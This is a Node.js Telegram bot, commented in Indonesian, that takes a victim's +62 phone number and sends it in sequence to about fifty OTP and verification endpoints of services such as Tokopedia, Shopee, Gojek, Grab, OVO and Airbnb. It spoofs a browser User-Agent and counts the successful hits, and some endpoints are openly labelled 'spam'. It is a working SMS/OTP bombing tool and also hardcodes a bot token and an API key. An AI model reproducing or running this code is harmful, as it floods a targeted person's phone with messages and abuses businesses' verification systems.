const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment-timezone');
const cron = require('node-cron');

// Konfigurasi Bot
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});

// Daftar API OTP (deduplicated)
const otpApis = [
  'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
  'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
  'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=',
  'https://sofia.bmsecure.id/central-api/oauth/token',
  'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
  'https://keranjangbelanja.co.id/api/v1/user/otp',
  'https://titipku.tech/v1/mobile/auth/otp?method=wa'
];

// Fungsi untuk mendapatkan waktu sekarang
function getCurrentTime() {
  return moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
}

// Fungsi untuk mengirim OTP dengan delay
async function sendOTP(phoneNumber) {
  const results = [];
  
  for (const [index, apiUrl] of otpApis.entries()) {
    try {
      // Add delay between requests (1 second)
      if (index > 0) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      const startTime = Date.now();
      const response = await axios.post(apiUrl, {
        phone: phoneNumber
      }, {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        },
        timeout: 5000 // 5 second timeout
      });
      
      const endTime = Date.now();
      const duration = (endTime - startTime) / 1000;
      
      results.push({
        api: apiUrl,
        status: 'Success',
        duration: `${duration}s`
      });
    } catch (error) {
      results.push({
        api: apiUrl,
        status: 'Failed',
        error: error.message
      });
    }
  }
  
  return results;
}

// Command handler
bot.onText(/\/start|\/mulai/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      keyboard: [[{ text: 'Kirim Nomor +62' }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  };
  bot.sendMessage(chatId, 'Silakan klik tombol "Kirim Nomor +62" untuk memulai.', options);
});

bot.onText(/Kirim Nomor \+62/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Silakan kirim nomor telepon dengan format +62xxxxxxxxxxx');
});

bot.onText(/\+62\d{10,15}/, async (msg) => {
  const chatId = msg.chat.id;
  const phoneNumber = msg.text;
  
  if (!phoneNumber.match(/^\+62\d{10,15}$/)) {
    return bot.sendMessage(chatId, 'Format nomor salah. Gunakan format +62xxxxxxxxxxx (10-15 digit)');
  }
  
  const processingMsg = await bot.sendMessage(chatId, `Memulai mengirim OTP ke ${phoneNumber}...\nWaktu: ${getCurrentTime()}`);
  
  try {
    const results = await sendOTP(phoneNumber);
    
    const successCount = results.filter(r => r.status === 'Success').length;
    const failedCount = results.length - successCount;
    
    let report = `Laporan Pengiriman OTP ke ${phoneNumber}\n`;
    report += `Waktu: ${getCurrentTime()}\n`;
    report += `Total API: ${results.length}\n`;
    report += `Berhasil: ${successCount}\n`;
    report += `Gagal: ${failedCount}\n\n`;
    
    // Send summary first
    await bot.editMessageText(report, {
      chat_id: processingMsg.chat.id,
      message_id: processingMsg.message_id
    });
    
    // Send detailed results in chunks
    const chunkSize = 10;
    for (let i = 0; i < results.length; i += chunkSize) {
      const chunk = results.slice(i, i + chunkSize);
      const chunkReport = chunk.map(result => 
        `${result.status === 'Success' ? '✅' : '❌'} ${result.api}\nStatus: ${result.status}\n${result.status === 'Success' ? `Durasi: ${result.duration}` : `Error: ${result.error}`}`
      ).join('\n\n');
      
      await bot.sendMessage(chatId, chunkReport);
    }
  } catch (error) {
    bot.sendMessage(chatId, `Terjadi error: ${error.message}`);
  }
});

// ... [rest of your command handlers remain the same]
